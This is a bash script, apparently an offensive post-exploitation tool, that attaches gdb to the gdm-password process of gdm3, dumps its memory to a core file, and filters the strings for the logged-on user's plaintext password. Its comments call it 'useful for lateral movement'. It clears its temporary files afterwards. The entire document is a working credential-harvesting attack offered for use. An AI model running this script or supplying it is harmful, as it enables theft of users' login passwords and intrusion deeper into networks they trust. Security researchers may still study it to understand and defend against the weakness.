#!/bin/bash
  
# gdm3 3.26.2.1-3 (and possibly later) stores the credentials of the logged on user in plaintext in memory.
# Useful for lateral movement; we're on a box, but we don't yet have any credentials...
# This script requires root or privileged access to gdb/gcore/ptrace, etc.
# Author: @0rbz_

cat << "EOF"
          __                                               __ 
.-----.--|  |.--------.-----.---.-.-----.-----.--.--.--.--|  |
|  _  |  _  ||        |  _  |  _  |__ --|__ --|  |  |  |  _  |
|___  |_____||__|__|__|   __|___._|_____|_____|________|_____|
|_____| @secure_mode  |__|                                    
                
EOF

# check ptrace_scope
ptrace_scope=$(cat /proc/sys/kernel/yama/ptrace_scope)

if [ "$ptrace_scope" -eq "3" ]; then
        echo -e "\nUse of ptrace appears to be restricted due to /proc/sys/kernel/yama/ptrace_scope being set to $ptrace_scope. This won't work.";
        exit 1;
fi

gdb=$(which gdb)
strings=$(which strings)
commands="/tmp/gdb_cmds.txt"
gdmpassword_pid=$(ps aux |grep 'gdm-password' |grep -v grep |awk '{print $2}')

echo -e "generate-core-file /tmp/core_file\nq\ny" >> /tmp/gdb_cmds.txt

$gdb -p $gdmpassword_pid -x $commands --batch-silent 2>/dev/null
$strings /tmp/core_file > /tmp/core_strings

account=$(grep 'HOME=' /tmp/core_strings |cut -f2 -d"/")
password=$(grep -E -C3 'myhostname|protocols|mdns4_minimal' /tmp/core_strings |grep -v '\-\-' |grep -v ':1.2' | grep -v '_pammodutil_' | grep -v '/lib/x86_64-linux-gnu' | grep -v 'libcap.so.2' |grep -v '/lib/x86_64-linux-gnu/security/pam_deny.so' |grep -v '/org/freedesktop/Accounts/User0' |grep -v '^riable' |grep -v 'U-V' |grep -v 'LC_MESSAGES' | grep -v 'yManager.Worker' | grep -v '^onmentVariable' |grep -v 'DBUS_SESSION_BUS_ADDRESS' |grep -v '^DBus' |grep -v 'XDG_SESSION_DESKTOP' |grep -v '^mdns4_minimal' | grep -v 'freedesktop/Accounts' |grep -v 'freedesktop.Accounts' |grep -v '/usr/local/bin:' | grep -v 'org.freedesktop.DBus.Error.PropertyReadOnly' | grep -v '/Accounts/' |grep -v '/DisplayManager/' | sort -u)
echo -e 'USERNAME:' $account '\n\nPASSWORD CANDIDATES:\n' 
echo $password\ | tr " " "\n"
rm /tmp/core_strings && rm /tmp/core_file && rm /tmp/gdb_cmds.txt
